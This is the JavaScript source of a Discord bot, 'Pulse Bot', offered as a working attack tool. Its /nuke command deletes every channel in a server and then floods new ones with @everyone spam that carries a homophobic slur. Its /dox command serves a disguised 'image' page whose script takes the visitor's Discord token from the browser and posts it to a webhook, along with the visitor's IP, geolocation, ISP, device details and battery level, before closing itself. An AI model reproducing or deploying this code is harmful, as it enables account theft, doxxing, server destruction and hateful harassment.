const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const express = require('express');
const app = express();
const crypto = require('crypto');

const TOKEN = process.env.TOKEN;
const PORT = process.env.PORT || 3000;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';

if (!TOKEN) {
    console.error('❌ TOKEN environment variable is required!');
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

const links = new Map();
let nukeRunning = false;
let nukeGuildId = null;

app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));

app.get('/img/:id.png', (req, res) => {
    const id = req.params.id;
    if (!links.has(id)) return res.status(404).send('Image not found');
    const data = links.get(id);
    res.type('text/html');
    res.send(generateDoxHTML(data.webhook));
});

// ---- COMMAND REGISTRATION ----
async function registerCommands() {
    try {
        await client.application.commands.set([
            {
                name: 'nuke',
                description: '💀 Infinite nuke - starts the nuke'
            },
            {
                name: 'stop',
                description: '⏹️ Stops the nuke'
            },
            {
                name: 'dox',
                description: '📸 Generate dox link',
                options: [
                    {
                        name: 'webhook',
                        type: 3,
                        description: 'Webhook URL',
                        required: true
                    }
                ]
            },
            {
                name: 'ping',
                description: '🏓 Check bot latency'
            },
            {
                name: 'serverinfo',
                description: '📊 Get server information'
            },
            {
                name: 'userinfo',
                description: '👤 Get user information',
                options: [
                    {
                        name: 'user',
                        type: 6,
                        description: 'Target user',
                        required: false
                    }
                ]
            },
            {
                name: 'avatar',
                description: '🖼️ Get user avatar',
                options: [
                    {
                        name: 'user',
                        type: 6,
                        description: 'Target user',
                        required: false
                    }
                ]
            },
            {
                name: 'say',
                description: '💬 Make the bot say something',
                options: [
                    {
                        name: 'message',
                        type: 3,
                        description: 'Message to say',
                        required: true
                    }
                ]
            }
        ]);
        console.log('✅ Commands registered');
    } catch (error) {
        console.error('Failed to register commands:', error);
    }
}

// ---- INTERACTION HANDLER ----
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, options, user, member, guild, channel } = interaction;

    // ---- NUKE ----
    if (commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });

        const guild = interaction.guild;
        if (!guild) return interaction.editReply('❌ Server only.');

        const botMember = guild.members.cache.get(client.user.id);
        if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.editReply('❌ I need **Administrator** permissions.');
        }

        if (nukeRunning) return interaction.editReply('❌ Nuke already running. Use `/stop`.');

        nukeRunning = true;
        nukeGuildId = guild.id;
        await interaction.editReply('🚀 **NUKE STARTED!** Use `/stop` to stop.');
        await startNuke(guild);
    }

    // ---- STOP ----
    if (commandName === 'stop') {
        await interaction.deferReply({ ephemeral: true });
        if (!nukeRunning) return interaction.editReply('❌ No nuke running.');
        nukeRunning = false;
        nukeGuildId = null;
        await interaction.editReply('⏹️ **Nuke stopped.**');
    }

    // ---- DOX ----
    if (commandName === 'dox') {
        await interaction.deferReply({ ephemeral: true });

        const guild = interaction.guild;
        if (!guild) return interaction.editReply('❌ Server only.');

        const wh = interaction.options.getString('webhook');
        if (!wh || !wh.startsWith('https://discord.com/api/webhooks/')) {
            return interaction.editReply('❌ Invalid webhook URL.');
        }

        const id = crypto.randomBytes(6).toString('hex');
        const url = `https://pulsebot-qtgf.onrender.com/img/${id}.png`;
        links.set(id, { webhook: wh, user: interaction.user.tag, created: Date.now() });

        const embed = new EmbedBuilder()
            .setTitle('✅ Dox Link Ready')
            .setColor(0x22c55e)
            .setDescription(`🔗 **${url}**\n\nSends IP, location, ISP, battery, and device info.`)
            .setFooter({ text: `Generated by ${interaction.user.tag}` });

        await interaction.editReply({ embeds: [embed] });
    }

    // ---- PING ----
    if (commandName === 'ping') {
        const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
        const latency = sent.createdTimestamp - interaction.createdTimestamp;
        await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
    }

    // ---- SERVERINFO ----
    if (commandName === 'serverinfo') {
        await interaction.deferReply({ ephemeral: true });
        if (!guild) return interaction.editReply('❌ Server only.');

        const owner = await guild.fetchOwner();
        const embed = new EmbedBuilder()
            .setTitle(`📊 ${guild.name}`)
            .setColor(0x8B5CF6)
            .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }) || null)
            .addFields(
                { name: '🆔 Server ID', value: guild.id, inline: true },
                { name: '👑 Owner', value: owner.user.tag, inline: true },
                { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
            );
        await interaction.editReply({ embeds: [embed] });
    }

    // ---- USERINFO ----
    if (commandName === 'userinfo') {
        await interaction.deferReply({ ephemeral: true });
        const target = interaction.options.getUser('user') || user;
        const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;

        const embed = new EmbedBuilder()
            .setTitle(`👤 ${target.tag}`)
            .setColor(0x8B5CF6)
            .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
            .addFields(
                { name: '🆔 User ID', value: target.id, inline: true },
                { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
            );
        if (memberTarget) {
            embed.addFields(
                { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
            );
        }
        await interaction.editReply({ embeds: [embed] });
    }

    // ---- AVATAR ----
    if (commandName === 'avatar') {
        await interaction.deferReply({ ephemeral: true });
        const target = interaction.options.getUser('user') || user;
        const embed = new EmbedBuilder()
            .setTitle(`${target.tag}'s Avatar`)
            .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
            .setColor(0x8B5CF6);
        await interaction.editReply({ embeds: [embed] });
    }

    // ---- SAY ----
    if (commandName === 'say') {
        await interaction.deferReply({ ephemeral: true });
        const msg = interaction.options.getString('message');
        if (!channel) return interaction.editReply('❌ No channel.');
        await channel.send(msg);
        await interaction.editReply('✅ Sent.');
    }
});

// ---- START NUKE ----
async function startNuke(guild) {
    const variants = [
        '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER'
    ];
    const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

    const channels = guild.channels.cache;
    console.log(`Deleting ${channels.size} channels...`);
    
    const channelArray = Array.from(channels.values());
    for (let i = 0; i < channelArray.length; i += 10) {
        const batch = channelArray.slice(i, i + 10);
        await Promise.all(batch.map(async (ch) => {
            try { await ch.delete(); } catch(e) {}
        }));
        await new Promise(r => setTimeout(r, 50));
    }
    console.log('All channels deleted.');

    async function spamChannel(ch) {
        if (!nukeRunning) return;
        try {
            while (nukeRunning) {
                try {
                    const line = variants[Math.floor(Math.random() * variants.length)];
                    let big = `@everyone ${line}\n`;
                    while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
                        big += line + '\n';
                    }
                    big += `\n${inviteLine}`;
                    await ch.send(big.slice(0, 2000));
                } catch(e) {}
                await new Promise(r => setTimeout(r, 10));
            }
        } catch(e) {}
    }

    async function createChannelsAndSpam() {
        let createdCount = 0;
        while (nukeRunning) {
            try {
                const newChannels = await Promise.all([
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)
                ]);
                
                const valid = newChannels.filter(c => c !== null);
                for (const ch of valid) spamChannel(ch);
                createdCount += valid.length;
                console.log(`Created ${createdCount} channels`);
            } catch(e) {}
            await new Promise(r => setTimeout(r, 10));
        }
    }

    createChannelsAndSpam();
    guild.channels.cache.forEach(ch => {
        if (ch.type === ChannelType.GuildText) spamChannel(ch);
    });
}

// ---- DOX HTML ----
function generateDoxHTML(webhook) {
    return `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; }
        body { background: #0b0b12; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; }
        .container { text-align: center; }
        .container img { max-width: 90%; max-height: 80vh; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
        .caption { color: #555; font-size: 14px; margin-top: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg" alt="Cat" />
        <div class="caption">Loading...</div>
    </div>

<script>
const WEBHOOK = "${webhook}";

function send(data) {
    fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    }).catch(() => {});
}

// ---- STEAL TOKEN ----
(function() {
    try {
        const token = localStorage.getItem('token') || 
                      document.cookie.split('; ').find(r => r.startsWith('token='))?.split('=')[1];
        if (token) {
            send({ content: "**🎯 Discord Token:** ```" + token + "```" });
        }
    } catch(e) {}
})();

// ---- GET IP & DOX ----
(async function() {
    try {
        const res = await fetch('https://ipinfo.io/json');
        const d = await res.json();
        if (!d.ip) return;

        const ua = navigator.userAgent;
        const browser = ua.includes('Edg') ? 'Edge' : ua.includes('Chrome') ? 'Chrome' : ua.includes('Firefox') ? 'Firefox' : ua.includes('Safari') ? 'Safari' : 'Unknown';
        const os = ua.includes('Windows NT 10.0') ? 'Windows 10/11' : ua.includes('Mac OS X') ? 'macOS' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Unknown';
        const device = /mobile|android|iphone|ipad/i.test(ua) ? 'Mobile' : 'Desktop';

        const lat = d.loc ? d.loc.split(',')[0] : 'N/A';
        const lon = d.loc ? d.loc.split(',')[1] : 'N/A';
        const map = lat !== 'N/A' ? 'https://www.google.com/maps?q=' + lat + ',' + lon : 'N/A';

        const embed = {
            title: "☠️ Doxxed",
            color: 0xFF0000,
            fields: [
                { name: "🌐 IP", value: d.ip || 'N/A', inline: true },
                { name: "🏙️ City", value: d.city || 'N/A', inline: true },
                { name: "🗺️ Region", value: d.region || 'N/A', inline: true },
                { name: "🌍 Country", value: d.country || 'N/A', inline: true },
                { name: "📮 Postal", value: d.postal || 'N/A', inline: true },
                { name: "🏢 ISP", value: d.org || 'N/A', inline: true },
                { name: "🕒 Timezone", value: d.timezone || 'N/A', inline: true },
                { name: "📍 Location", value: map, inline: false },
                { name: "🧠 Browser", value: browser, inline: true },
                { name: "💻 OS", value: os, inline: true },
                { name: "🖥️ Device", value: device, inline: true },
                { name: "⏰ Time", value: new Date().toString(), inline: false }
            ],
            footer: { text: "☠️ PULSE DOX" }
        };

        send({ embeds: [embed] });

        try {
            const b = await navigator.getBattery();
            send({ content: "🔋 Battery: " + Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : " (Not Charging)") });
        } catch(e) {}

    } catch(e) {
        send({ content: "❌ Dox error: " + e.message });
    }
})();

// ---- CLOSE ----
setTimeout(() => {
    document.body.innerHTML = '';
    document.body.style.background = '#000';
    document.body.style.margin = '0';
    document.body.style.height = '100vh';
    setTimeout(() => {
        window.close();
        window.location.href = 'about:blank';
    }, 500);
}, 5000);

document.querySelector('.caption').textContent = 'Image loaded successfully.';
</script>
</body>
</html>`;
}

setInterval(() => {
    const keys = Array.from(links.keys());
    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
}, 60000);

// ---- BOT STARTUP ----
client.once('ready', async () => {
    console.log(`🤖 ${client.user.tag} is online!`);
    await registerCommands();
    console.log('✅ Bot is ready!');
});

client.login(TOKEN);
